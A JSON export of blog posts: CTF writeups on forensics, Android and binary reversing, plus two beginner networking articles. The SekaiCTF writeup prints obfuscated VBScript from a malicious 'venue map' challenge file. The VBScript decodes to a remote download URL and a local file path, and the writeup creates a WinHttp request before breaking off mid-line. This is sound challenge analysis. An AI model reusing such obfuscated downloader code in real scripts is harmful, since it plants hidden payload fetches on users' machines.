[
  
  {
    "title": "BackdoorCTF'23 Writeups",
    "url": "/posts/BackdoorCTF'23-Writeups/",
    "categories": "Writeups",
    "tags": "reversing, Forensics",
    "date": "2023-12-23 09:41:40 +0530",
    





    
    "snippet": "I’m sharing writeups for the challenges I  created for Backdoor CTF’23, hosted by InfoSecIITR. Here they are :-Forensics/HeadacheDescription:-I’ve had a headache since last evening. Is there a magi...",
    "content": "I’m sharing writeups for the challenges I  created for Backdoor CTF’23, hosted by InfoSecIITR. Here they are :-Forensics/HeadacheDescription:-I’ve had a headache since last evening. Is there a magic spell that can cure it immediately?Challenge File:  fileThis challenge was beginner level forensics challenge. A png image is given as the challenge file, which seems to be corrupted. As the name of the chall suggests, we should check the header of the png. Using hexedit, first 8 bytes seems incorrect.Edit correct header bytes 89 50 4E 47 0D 0A 1A 0A and save the file, that reveals the flag.That was ‘s’ not ‘8’, I am sorry, it was bit cursive :)Flag:- flag{sp3ll_15_89_50_4E_47}Forensics/DrunkDescription:- I was offered a famous Italian drink along with a message, but it affected me in such a way that I couldn’t decipher it. Need your help and please don’t make excuse if you can’t.Challenge File: file1 file2In this challenge, something.txt and encoded.bin are provided. In something.txt file, there seems to be some type of encoding, so to figure out this, I use cyberchef. It is octal encoding followed by hex and then base64 encoded. We get zlMg5K3TobbFh_8l7doDT_408rH7Md_W3Oc1yKX1FrA=.Now, the real challenge starts to figure out what encoded.bin is all about. In encoded.bin, data seems to be encrypted. The string we got from something.txt may be the key to decrypt it. Let’s try to get the encryption method. From the description, Italian Drink. Try to google about Italian drinks and some cryptographic encryption methods, Fernet will be the result (Fernet-Branca is an Italian armaro). Though you have to google it hard. Now, it becomes super easy to decrypt the data. This is the following script I used to decrypt the data. from cryptography.fernet import Fernet from PIL import Image import io def decrypt_image(encrypted_image, key):        with open(encrypted_image, 'rb') as file:        encrypted_data = file.read()        f = Fernet(key)    decrypted_data = f.decrypt(encrypted_data)    decrypted_image = Image.open(io.BytesIO(decrypted_data))    decrypted_image.save('decrypted_image.png')     if __name__ == \"__main__\":    encrypted_image = \"encoded.bin\"     encryption_key ='zlMg5K3TobbFh_8l7doDT_408rH7Md_W3Oc1yKX1FrA='    decrypt_image(encrypted_image, encryption_key)Though this challenge involves cryptographic part but forensics is incomplete without cryptographic as all encryption methods use it. Fernet is one of the most common encryption methods used in forensics.Flag:- flag{Th1s_time_n0t_cURs1v3}Rev/Open SesameDescription:- Whisper the phrase, unveil with ‘Open Sesame’.Challenge File: fileAn apk file is provided as the challenge file. First open this apk in  JADX tool to see its source code. After opening the apk in Jadx, navigate to com.example.open_sesame.MainActivity. This app requires UserID and Key, and if they are invalid, Invalid credentials. Please try again.\" will be displayed, but valid UserID and key will not display the flag. For this, understanding the code logic is must. We have few functions here : n4ut1lus, sh4dy, it4chi, sl4y3r and flag.The  valid_password is 4l1baba (from the given ascii codes), and AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR has a constant value 108. Now, it4chi function extracts digits from the password (4,1), sh4dy function appends the digits and return as string (41) and sl4y3r function subtracts 1 from the number (40). Now, in flag function, U|]rURuoU^PoR_FDMo@X]uBUg is xored with 40. This will give us the flag.Flag:- flag{aLiBabA_and_forty_thiEveS}Rev/Sl4ydroidDescription:- This challenge has got some Rizz !!Challenge File: fileThis challenge is based on dynamic debugging of Android Application. Open the app on JADX, and naviagte to com.backdoor.sl4ydroid.MainActivity to see its source code. This app loads a native library named sl4ydroid using System.loadLibrary(). The class declares several native methods damn, k2, kim, nim that are implemented in native code, not in Java. These native methods are invoked within onCreate method of MainActivity class with strings as parameters which are retrieved from the string resource using identifiers, like (R.string.k1).   So, the implementation of these methods are in native library. Extract the library by either unzipping it or using apktool. So libsl4ydroid.so will be extracted in lib/ folder. Open it in IDA or any other debugging software (I personally prefer IDA) and try to reverse the code. To get the flag, there are more than one approaches that can be followed. I’ll discuss few of them here. First, flag can be found by static analysis but that can be bit complex and time consuming process. If we look at the pseudo code, we can clearly see that it involves a RC4 function: ring. So this hints, we should debug it dynamically. To do dyanmic analysis, we have to set up Remote Android Debugger. For this, either use emulator or your own android device (provided developer mode is on). Through adb, install the apk and start android server (There are many blogs explaining this process, though it is applicable for IDA pro). After successfully setting up the debugger, attach the process (of this apk) and debug the code dynamically now.This process seems bit lengthy and sometimes it can be bit uncertain (as I have gone through it often:) ). Interesting thing to notice in the code is System.out.println(message) under the functions sh4dy, sl4y3r, it4chi and n4ut1lus. It might be possible that these methods are being called from native methods using JNI (can be viewed in IDA). Let’s try to log these results. For this, we use JADX debugger, launch the app on emulator or own device and click Launch App. In logcat, we have our flag. This challenge has surely got some Rizz :) Flag:- flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}Hope !! You all enjoyed the challenges."
  },
  
  {
    "title": "Networking - Part 2",
    "url": "/posts/Networking-Part-2/",
    "categories": "Blogs, Networking",
    "tags": "Computer Networking",
    "date": "2023-12-15 06:21:40 +0530",
    





    
    "snippet": "Welcome to the other part of Computer Networking. In this part, we’ll be exploring the protocols involved in networking.HTTPHTTP stands for Hypertext Tranfer Protocol. It can be defined as the foun...",
    "content": "Welcome to the other part of Computer Networking. In this part, we’ll be exploring the protocols involved in networking.HTTPHTTP stands for Hypertext Tranfer Protocol. It can be defined as the foundation of communication on the web. It is an application layer protocol, used to transfer information between devices. This protocol involves various request methods and corresponding responses to communicate between clients and servers.Request Methods  GET: Requests data from a specified resource.  POST: Submits data to be processed to a specified resource.  PUT: Updates a resource or creates a new one if it doesn’t exist.  DELETE: Deletes the specified resource.  PATCH: Partially updates a resource.  HEAD: Requests the headers of a resource, similar to GET but without the body.  OPTIONS: Queries the server for available methods on a resource.ResponsesThe server responds to these request methods with status codes, indicating the success or failure of the request.  1xx: Informational - Request received, continuing process.  2xx: Success - Request successfully received, understood, and accepted.  3xx: Redirection - Further action needed to complete the request.  4xx: Client Error - Request contains bad syntax or cannot be fulfilled.  5xx: Server Error - Server failed to fulfill a valid request.Example: 502: Bad Gateway, 500: Internal Server Error, 200: Successful GET request, 201: Successful POST request, 404:URL can’t be found, 102:Processing, 301:Moved Permanently, 305:Use ProxySMTPSMTP stands for Simple Mail Transport Protocol. It is a standard protocol used for sending and receiving emails over the internet. SMTP works between mail servers to handle the sending of emails from the sender’s email client to the recipient’s email server. It operates on TCP port 25 by default. To add more security, modern SMTP servers use SSL (Secure Shell) or TLS (Transport Layer Security) to encrypt the communication and to prevent unauthorized access or interception of emails..How does an SMTP server work?      When we send an email from our email client (like Gmail, Outlook, Yahoo etc.), our email client communicates with our email provider’s SMTP server.        Our email client formats the email according to SMTP standards (including the sender’s address, recipient’s address, subject, message body, and attachments).        The email client establishes a connection to the SMTP server using the SMTP protocol on port 25. It sends the formatted email to the SMTP server.        The SMTP server processes the email, performs checks (such as domain validation), and decides whether to relay the message to another server or deliver it locally (if the recipient is on the same server).        If the recipient is on a different domain, the SMTP server might forward the email to another SMTP server responsible for handling emails for that domain. This process continues until the email reaches the recipient’s SMTP server.        The recipient’s SMTP server receives the email, performs further checks, and places it in the recipient’s mailbox or forwards it to the recipient’s email client for retrieval.  POP/IMAPThese are two standard protocols used by email clients to retrieve emails from a mail server. POP stands for Post Office Protocol. It is an older protocol that downloads the emails from the server and stores them locally on the device. IMAP stands for Internet Message Access Protocol that works in contrast to POP. It keeps emails stored on the server. IMAP is ideal for users who access their emails from multiple devices (such as phones, tablets, and computers) and want their emails to be synchronized across all devices.DHCPDHCP stands for Dynamic Host Configiration Protocol. This protocol automates the assignment of IP addresses and other network configuration to devices in the network especially in the larger network where manually assigning addresses to each device would be impractical. Let’s understand the how it works :-When a device connects to a network, it sends out a broadcast message to a DHCP server on the network requesting an IP address. It manages a pool of available IP addresses and configuration settings. The DHCP server selects an available IP address from its pool and assigns it to the requesting device. This assignment is temporary and is known as a lease. The lease includes a lease duration, specifying how long the IP address is valid for that device. It may also provide additional network configuration information, such as the subnet mask, default gateway, DNS servers, and more. Once the IP address and configuration settings are assigned, DHCP server sends an acknowledgment to the requesting device, confirming the lease.The device can also request a lease renewal from the DHCP server to continue using the same IP address. If the DHCP server approves the renewal, the lease duration is extended.FTPFTP stands for File Transfer Protocol, a standard network protocol for transferring files between server and client on a computer network. It works on a client-server model where client conencts to server to perform file transfers.In the above image, I connected to a FTP server by username and password. By ls command, I listed all the files present on the server (There are some Organic Reactions files of my JEE time :p). Similarly, with send I can send files and with get, I can download the files from the server. There are other commands also related to FTP server.Traditional FTP doesn’t encrypt data during transmission, which may cause security risks. Secure versions like FTPS (FTP Secure) and SFTP (SSH File Transfer Protocol) add encryption for secure data transfer.ARPARP stands for Address Resolution Protocol, that operates at 2nd layer (Data Link Layer). It is used for mapping an IP address to a physical machine address, such as a MAC address in a local network. Let’s understand how ARP works :-When a device wants to communicate with another device on the same local network and knows the IP address but not the MAC address of the destination, it uses ARP to find the MAC address associated with the IP address. The requesting device sends an ARP request packet containing the target IP address across the network. The device that has the corresponding IP address in its ARP cache responds with an ARP reply packet, providing its MAC address and after receiving the reply, the requesting device stores this mapping in its ARP cache or table. This cache helps speed up future communications by avoiding the need for ARP requests for frequently accessed IP addresses.However, ARP cache size is limited by design, so it is purged regularly to free up space.BGP/OSPFBGP stands for Border Gateway Protocol  and OSPF stands for Open Shortest Path First. Both are routing protocols but they operate in different ways.BGP is an exterior gateway protocol (EGP) primarily used to exchange routing information between different autonomous systems (AS) on the internet.What is autonomous system? It is a collection of IP networks and routers under a common administration sharing a single routing policy.The purpose of BGP is to enable routers within different autonomous systems to share information about the best available paths for reaching specific destinations across the internet. It depends on mutliple factors such as network policies, path attributes, and the number of autonomous systems a route passes through.OSPF is an interior gateway protocol (IGP) designed for use within an autonomous system. Its purpose is to determine the best route path within an autonomous system. It is easily configured than BGP which is lot more complex. It also supports faster convergence which helps in effiient routing.TCPTCP stands for Transmission Control Protocol, a connection oriented protocol i.e it establishes a connection between sender and reciever before exchanging data. It ensures reliable, ordered, and error-checked delivery of data packets. TCP guarantees the delivery of data by using acknowledgments and retransmissions. It also include flow control mechanisms to manage the rate of data transmission between devices.Transmission: It refers to the process of sending data from one device to another across a network. Data is broken down into smaller units called packets or framesAcknowledgments (ACK): After sending data, the sender expects confirmation from the receiver that the data arrived intact. This acknowledgment serves as confirmation that the data was successfully received. If the sender does not receive an acknowledgment within a specified time frame or detects packet loss, it retransmits the data to ensure reliable delivery.There is also another flag called SYN which stands for Synchronize. When a device wants to establish a TCP connection with another device, it sends a TCP packet with the SYN flag set in the header. This packet contains an initial sequence number, which is used to start the conversation and synchronize sequence numbers between the sender and receiver.Sequence numbers are unique identifiers assigned to TCP segments to maintain the order and integrity of data transmitted over a connection. They help in reassembling packets in the correct order at the receiver’s end. Each segment of data sent via TCP contains a sequence number, allowing the receiver to arrange and reconstruct the data in the correct order.When a TCP connection is initiated, the SYN flag is set in the first packet sent by the initiating device. This packet includes an initial sequence number. The receiving device responds with its own SYN packet, acknowledging the connection request and also including its own initial sequence number. So the SYN flag is used to synchronize sequence numbers between devices initiating a TCP connection. It marks the beginning of a three-way handshake in TCP, allowing devices to exchange sequence numbers and establish a reliable connection before data transmission begins.The three-way handshake is a fundamental process in the TCP for establishing a reliable connection between two devices over a network. Data transmission can begin after the completion of the three-way handshake.The three steps involved in the TCP three-way handshake are:SYN:    The initiating device sends a TCP segment with the SYN flag set to the receiving device to initiate a connection request. This packet includes an initial sequence number chosen by the client to start the conversation.SYN-ACK:    Upon receiving the SYN segment, if the server is available and willing to establish a connection, it responds with a TCP segment. This segment has both the SYN and ACK flags set, acknowledging the receipt of the client's SYN packet and also indicating its own readiness to establish the connection.    The server also chooses its own initial sequence number for the conversation.ACK:    Finally, the client responds to the server's SYN-ACK packet with an ACK packet. This packet acknowledges the receipt of the server's SYN-ACK segment. At this point, the connection is established and both devices have synchronized sequence numbers.UDPIt stands for User Datagram Protocol, a connection-less protocol i.e. it does not establish a direct connection for data exchange. It sends data packets, called datagrams, without establishing a connection or checking whether the receiver is ready or exists. Unlike TCP, it does not have an error checking mechanism which may result in corruption and loss of data packets. UDP has lower overhead compared to TCP because it lacks the extensive error-checking and flow control mechanisms. This makes it faster and more efficient for real-time applications. It is used where speed and efficiency is prioritized over reliability like video streaming, gaming, DNS lookups and cases where small amount of loss of data is acceptable."
  },
  
  {
    "title": "Networking - Part 1",
    "url": "/posts/Networking-Part-1/",
    "categories": "Blogs, Networking",
    "tags": "Computer Networking, OSI model",
    "date": "2023-12-13 06:21:40 +0530",
    





    
    "snippet": "Hey everyone! This blog covers the basics of computer networking. So let’s start with the fundamental question… Exactly what is a computer network? It’s a network of two or more two devices exchang...",
    "content": "Hey everyone! This blog covers the basics of computer networking. So let’s start with the fundamental question… Exactly what is a computer network? It’s a network of two or more two devices exchanging information and data. Let’s understand this statement with the working of multiple devices connected to a router.Most of us have routers at our homes, and multiple devices (like laptops, smartphones and other devices) are connected to the network provided by ISP (Internet Service Provider). So what happens, ISP assigns an IP address to our router, let’s say 188.2.51.202. This is a global IP address that is unique and is what the outside world uses to identify and communicate with your home network. Our laptop has a local IP address like 192.168.254.11, while your smartphone might have 192.168.254.12, and so on. These are local IP addresses, used within your home network to communicate between devices.Now, our laptop wants to browse the internet. It sends a request, router will use NAT (Network Address Translation). It will replace the local IP of a laptop with the global IP of the router before sending the request to the internet.Here, there is a very important protocol that plays crucial role in assigning local IP addresses to devices dynamically :- DHCP (Dynamic Host Configuration Protocol).Let’s try to understand what IP address and what is the need for it. An IP address acts as a unique identifier for devices in a network, much like a street address pinpoints a particular building in a city. However, to ensure the data reaches the correct application or service on that device, we need something more specific. This is where ports come into play—they’re like room numbers or offices within that building. There are 2^16 ports ranging from 0 to 65535. Ports from 0 to 1023 are reserved. For e.g. port 80 is for HTTP, port 25 is for SMTP. We’ll talk about IP address and protocols in detail later.OSI modelTill now, we have built a fundamental understanding of networking. Let’s dive bit deeper to know more about networking and its complexities. For this, we turn to OSI model (Open System Interconnection model).OSI is a logical model for communication between systems. It was modeled first then protocols were implemented. It is composed of 7 layers, in which each layer is dependent on the layer above and the layer below.Application LayerIt is the topmost layer of the model that serves as an interface between the network and software running on the device. This layer is directly interacted with by users, and it hosts various protocols necessary for specific applications. Examples of application layer protocols include:  Hypertext Transfer Protocol (HTTP): For viewing web pages and accessing web resources.  Domain Name System (DNS): For quickly accessing web pages using names instead of IP addresses.  File Transfer Protocol (FTP): For transferring computer files.  Internet Message Access Protocol (IMAP): For accessing and storing email.  Simple Mail Transfer Protocol (SMTP): For sending outgoing email.Presentation LayerIt is the sixth layer of the model, responsible for the formatting and presentation of data. Its main functions include data translation, encryption and decryption for secure transmission, compression and decompression of data. It ensures that information sent from one system can be read by another system, regardless of differences in data representation.Session LayerThis layer manages and controls the communication between devices. The session layer handles the connection and authentication between a client or server, including actions like logon, lookup, log off, or session termination. DNS, along with name resolution protocols, operate in the session layer..Transport LayerIt is the fourth layer of the OSI model. Transport layer uses protocols like TCP and UDP for data transfer. The functions of this layer include:      Segmentation and ReassemblyThe transport layer breaks down data from the session layer into smaller segments for smooth transmission across the network. It then reassembles these segments into the original message at the receiving end. Protocols like TCP, UDP have different sizes of segments.        Congestion controlThis situation occurs when too many sources attempt to send data over the network, which may result in overflowing router buffers, thus causing the loss of data packets. Transport layer uses mechanisms to control the rate of transmission to prevent congestion and ensure efficient data delivery. For example, the sender is sending data to the receiver at 20 Mbps, but the receiver is not able to process the data at the same rate, so it asks the server for a 3 Mbps rate. This is called congestion control.        Multiplexing and DemultiplexingThe transport layer allows multiple applications to use the network simultaneously by multiplexing data from these applications into a single stream for transmission. At the receiving end, it demultiplexes the received data and directs it to the appropriate application.        Errors checking and correctionIt performs error checking by adding sequence numbers, checksums, or other mechanisms to detect errors in the transmitted data.  Network LayerThis layer is mainly responsible for the logical transmission of data over the entire network. Its main functions include routing, forwarding, and addressing (for identifying devices over the internet).      RoutingRouting is the process of determining the best path for sending data from the source to the destination based on various metrics, such as hop count, bandwidth, delay, or cost.        ForwardingForwarding involves the actual movement of packets from one router’s input interface to the appropriate output interface.  Data Link LayerThis layer divides packets received from the Network layer into frames and then sends them bit-by-bit to the physical layer. It is one of the most complex layers in the OSI model as it hides the complexities of the hardware. This layer also involves physical addressing, enabling the identification of the sender and receiver of frames on the network. Ethernet and Wi-Fi are examples of technologies that operate at the Data Link Layer.Physical LayerIt is the lowest layer in the OSI model that deals with the physical connection between devices and the transmission of raw data bits over a physical medium. It transforms the digital bits received from the Data Link Layer into signals that can be transmitted over the physical medium.Difference between Logical Addressing and Physical AddressingLogical Addressing refers to addressing scheme used to uniquely identify devices within a network at Network Layer. Logical addresses are used for routing data across networks. For e.g.  IP addresses in both IPv4 and IPv6 are examples of logical addresses.Physical Addressing involves unique identification of devices within a network at Data Link layer. For e.g. MAC (Media Access Control) addresses in Ethernet networks and the physical addresses in networks like Wi-Fi are examples of physical addressing.MAC addressIt stands for Media Access Control, a unique identfier address during device manufacturing. MAC is represented as 12-digit hexadecimal number in colon:hexadecimal notation. Each network interface in a device has its own MAC address. For e.g. if a device has both ethernet and wifi, there will be two MAC addresses. MAC address looks like : 00:1A:4C:3B:9D:2EIn this article, we’ve covered the basics of computer networking, including the OSI model. We’ll explore protocols in later parts of this article to build on what we’ve learned."
  },
  
  {
    "title": "CSAW'23 Quals",
    "url": "/posts/CSAW'23-Quals/",
    "categories": "Writeups, Reversing",
    "tags": "reversing",
    "date": "2023-09-18 09:41:40 +0530",
    





    
    "snippet": "I had the privilege of participating in the CSAW’23 Quals CTF as a member of InfosecIITR, and it proved to be a great experience. I am delighted to share the writeups for the reversing challenges m...",
    "content": "I had the privilege of participating in the CSAW’23 Quals CTF as a member of InfosecIITR, and it proved to be a great experience. I am delighted to share the writeups for the reversing challenges my team and I successfully solved during the competition.ReversingRebug1Description:-Can’t seem to print out the flag :( Can you figure out how to get the flag with this binary?Challenge File: fileThis challenge was beginner level reversing challenge. To see the decompiled code, open the provided binary in IDA and press F5.According to the code, the user is expected to input a 12-character string, and if the string length matches, they will receive a flag in response to the input.Now run the binary and give any 12-character input and you’ll get the flag.Flag:- csawctf{c20ad4d76fe97759aa27a0c99bff6710}Rebug2Description:- No input this time ;) Try to get the flag from the binary. When you find the answer of the program, please submit the flag in the following format: csawctf{output}Challenge File: fileThis time, there is no need of input as it was in Rebug1. So let’s have a look at the source code first. Open the binary in IDA and decompile it (pressing F5).Initially, a string is provided to us which undergoes certain operations and then another function printbincharis called only when (i &amp; 1) == 0 &amp;&amp; i -this condition is satisfied (i should be even and non-zero). Now look at printbinchar function.In this function, v4&lt;&lt;i&gt;&gt;7 a left shift operation is done which shifts its bits left by i positions and then right shift operation which shift its bits right by 7. The purpose of this function is to represent a char in in its binary form. But here again another function xoring is being called. Here, its pseudo-code :-Now, we have almost reached to our final destination. If above conditions are met, then ‘0’ will be added to our flag and if not, then ‘1’. So, to get flag, I just copied the above pseudo-code and modified it. I added print(flag) and ran it. Here it is- fileFlag:- csawctf{01011100010001110000}ImpossibrawlerDescription:- How do I beat these guys ?Challenge File: file1 file2This game was based on game-reversing. It was a nice challenge as it made me to spend a lot of time as I overlooked something very basic. So let’s discuss:-First, I ran the .exe file and found the flag was only accessible after completing two levels, but main catch here was, the bullets which player was firing were not causing the damage to enemies and thus their health remained constant. So in short, game was unbeatable by human(atleast for me as I’m very bad at gaming) to get flag.I first approached it by Cheat Engine to get control over required variables and I tried searching for strings too.. but it was not of any help. Then I tried to extract files from exe itself but it was also a futile effort. Then I thought about the game-engine used:- Godot Engine. I googled about godot engine game reversing and got this helpful tool- link. I used .pck file for unpacking my game and successfully recovered the project files.In level_2 script, when enemies_left == 0 range of a random number generator is seeded with the value obtained from int(Vals.sd) after which random floating number is generated, fbytes is converted to string. Flag is obtained by converting fbytes to ascii followed by hex encoding. Since Vals.sd is required, so I looked in level_1 script to check whether it was being updated. Yes, in level_1, Vals.sd was storing fbytes when enemies_left == 0. Initially vals.sd was set 0. The basic thing I overlooked the functionality of randf() which returns values between 0 and 1, so it does not matter whether vals.sd is updated or not because in level_2 it is casted into int type which makes it 0. var rng = RandomNumberGenerator.new() rng.seed = 0 var fbytes = rng.randf() fbytes = str(fbytes)   print(fbytes)Output is 0.202272. For flag, convert this to ascii and then in hex, i.e., 302e323032323732. This is our flag.Flag:- csawctf{302e323032323732}MiscAndroidDropperDescription:- The app does nothing!Challenge File: fileThis was an easy android reversing based challenge. For android reversing, I use jadx tool to view the source code. In jadx, navigate to com.example.dropper and here the code is :-Some base64 encoded data is given which is written to dropper.dex after being decoded. I did the same, decoded the data, got the .dex file content. Then to analyze the dex file, I ran jadx -d d_jadx dropper.dex command.Now, there is a link given in code, clicking on it, gave base64 data. Decoding base64 data is stored in notTheFlag variable and obf function is now called. So, we got the flag, using decoded data, which is passed in obf.Flag:- csawctf{dyn4m1c_lo4deRs_r_fuN!}"
  },
  
  {
    "title": "SekaiCTF 2023 - DEFCON Invitation",
    "url": "/posts/SekaiCTF-2023-DEFCON-Invitation/",
    "categories": "Writeups, Forensics",
    "tags": "Forensics",
    "date": "2023-08-28 06:21:40 +0530",
    





    
    "snippet": "Description:-As you all know, DEF CON CTF Qualifier 2023 was really competitive and we didn’t make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from...",
    "content": "Description:-As you all know, DEF CON CTF Qualifier 2023 was really competitive and we didn’t make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from Nautilus Institute to attend the event. Should we accept the invitation and schedule the trip?Challenge File: fileIn this challenge, a .eml file is provided which is commonly used for storing email messages. On opening this email, there was an attachment (calendar invitation). It is a .ics file which is for iCalendar files. In this, I got two links :- https://nautilus.org/ and https://storage.googleapis.com/defcon-nautilus/venue-guide.html. So, I opened both links. In first one, I got nothing but in second, I got something - Caesars Forum Venue Map and there was a download option for map, I downloaded that but to my surprise it was vbs script and now this challenge has been reduced to a vbs script based challenge.Now analysis part of vbs script starts…In this, I found this.. and deobsfucating   ewkjunfw = Replace(\"68IlllIllIIIllllIllII74IlllIllIIIllllIllII74IlllIllIIIllllIllII70IlllIllIIIllllIllII73IlllIllIIIllllIllII3aIlllIllIIIllllIllII2fIlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII6fIlllIllIIIllllIllII77IlllIllIIIllllIllII6eIlllIllIIIllllIllII6cIlllIllIIIllllIllII6fIlllIllIIIllllIllII61IlllIllIIIllllIllII64IlllIllIIIllllIllII31IlllIllIIIllllIllII36IlllIllIIIllllIllII34IlllIllIIIllllIllII37IlllIllIIIllllIllII2eIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII66IlllIllIIIllllIllII69IlllIllIIIllllIllII72IlllIllIIIllllIllII65IlllIllIIIllllIllII2eIlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6dIlllIllIIIllllIllII2fIlllIllIIIllllIllII6cIlllIllIIIllllIllII31IlllIllIIIllllIllII38IlllIllIIIllllIllII38IlllIllIIIllllIllII75IlllIllIIIllllIllII32IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII71IlllIllIIIllllIllII67IlllIllIIIllllIllII33IlllIllIIIllllIllII66IlllIllIIIllllIllII4fIlllIllIIIllllIllII6fIlllIllIIIllllIllII4cIlllIllIIIllllIllII70IlllIllIIIllllIllII69IlllIllIIIllllIllII6cIlllIllIIIllllIllII63IlllIllIIIllllIllII49IlllIllIIIllllIllII38IlllIllIIIllllIllII39IlllIllIIIllllIllII70IlllIllIIIllllIllII30IlllIllIIIllllIllII5fIlllIllIIIllllIllII68IlllIllIIIllllIllII34IlllIllIIIllllIllII45IlllIllIIIllllIllII30IlllIllIIIllllIllII63IlllIllIIIllllIllII47IlllIllIIIllllIllII4cIlllIllIIIllllIllII6aIlllIllIIIllllIllII6bIlllIllIIIllllIllII5fIlllIllIIIllllIllII75IlllIllIIIllllIllII76IlllIllIIIllllIllII42IlllIllIIIllllIllII55IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII45IlllIllIIIllllIllII5fIlllIllIIIllllIllII72IlllIllIIIllllIllII4dIlllIllIIIllllIllII5aIlllIllIIIllllIllII2dIlllIllIIIllllIllII48IlllIllIIIllllIllII35IlllIllIIIllllIllII2dIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII39IlllIllIIIllllIllII4bIlllIllIIIllllIllII72IlllIllIIIllllIllII39IlllIllIIIllllIllII53IlllIllIIIllllIllII51IlllIllIIIllllIllII4cIlllIllIIIllllIllII56IlllIllIIIllllIllII51IlllIllIIIllllIllII61IlllIllIIIllllIllII4bIlllIllIIIllllIllII53IlllIllIIIllllIllII69IlllIllIIIllllIllII4bIlllIllIIIllllIllII63IlllIllIIIllllIllII45IlllIllIIIllllIllII76IlllIllIIIllllIllII4aIlllIllIIIllllIllII4fIlllIllIIIllllIllII2dIlllIllIIIllllIllII45IlllIllIIIllllIllII6bIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII53IlllIllIIIllllIllII55IlllIllIIIllllIllII71IlllIllIIIllllIllII57IlllIllIIIllllIllII6cIlllIllIIIllllIllII72IlllIllIIIllllIllII4eIlllIllIIIllllIllII36IlllIllIIIllllIllII53IlllIllIIIllllIllII7aIlllIllIIIllllIllII58IlllIllIIIllllIllII67IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII4cIlllIllIIIllllIllII59IlllIllIIIllllIllII42IlllIllIIIllllIllII68IlllIllIIIllllIllII2dIlllIllIIIllllIllII46IlllIllIIIllllIllII35IlllIllIIIllllIllII65IlllIllIIIllllIllII6dIlllIllIIIllllIllII34IlllIllIIIllllIllII49IlllIllIIIllllIllII41IlllIllIIIllllIllII34IlllIllIIIllllIllII69IlllIllIIIllllIllII58IlllIllIIIllllIllII33IlllIllIIIllllIllII74IlllIllIIIllllIllII4fIlllIllIIIllllIllII49IlllIllIIIllllIllII47IlllIllIIIllllIllII68IlllIllIIIllllIllII30IlllIllIIIllllIllII45IlllIllIIIllllIllII6aIlllIllIIIllllIllII34IlllIllIIIllllIllII36IlllIllIIIllllIllII47IlllIllIIIllllIllII6cIlllIllIIIllllIllII77IlllIllIIIllllIllII76IlllIllIIIllllIllII4cIlllIllIIIllllIllII4fIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII38IlllIllIIIllllIllII70IlllIllIIIllllIllII7aIlllIllIIIllllIllII76IlllIllIIIllllIllII75IlllIllIIIllllIllII79IlllIllIIIllllIllII39IlllIllIIIllllIllII31IlllIllIIIllllIllII55IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII6aIlllIllIIIllllIllII31IlllIllIIIllllIllII72IlllIllIIIllllIllII32IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII6aIlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII59IlllIllIIIllllIllII73IlllIllIIIllllIllII55IlllIllIIIllllIllII4eIlllIllIIIllllIllII63IlllIllIIIllllIllII73IlllIllIIIllllIllII73IlllIllIIIllllIllII50IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII30IlllIllIIIllllIllII38IlllIllIIIllllIllII64IlllIllIIIllllIllII73IlllIllIIIllllIllII6bIlllIllIIIllllIllII57IlllIllIIIllllIllII52IlllIllIIIllllIllII70IlllIllIIIllllIllII6bIlllIllIIIllllIllII41IlllIllIIIllllIllII49IlllIllIIIllllIllII2fIlllIllIIIllllIllII79IlllIllIIIllllIllII65IlllIllIIIllllIllII61IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII35IlllIllIIIllllIllII68IlllIllIIIllllIllII76IlllIllIIIllllIllII67IlllIllIIIllllIllII70IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII76IlllIllIIIllllIllII6dIlllIllIIIllllIllII76IlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII65IlllIllIIIllllIllII66IlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6eIlllIllIIIllllIllII2dIlllIllIIIllllIllII66IlllIllIIIllllIllII6cIlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII70IlllIllIIIllllIllII6eIlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII58IlllIllIIIllllIllII4fIlllIllIIIllllIllII52IlllIllIIIllllIllII65IlllIllIIIllllIllII64\", \"IlllIllIIIllllIllII\", \" \")It results in 'https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed'Yes, I was going right.. now I have flag.png xored and need key with which I can get my flag.  StRREVErsE(replace(\"=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y\", \"###############_###\", \"z\"))It results in c:\\temp\\defcon-flag.png.compromised.Now search operation for key starts…So, we have to deobfuscate this vbs script. For this, I used vbsedit and it gave Dim http: Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") Dim url: url = 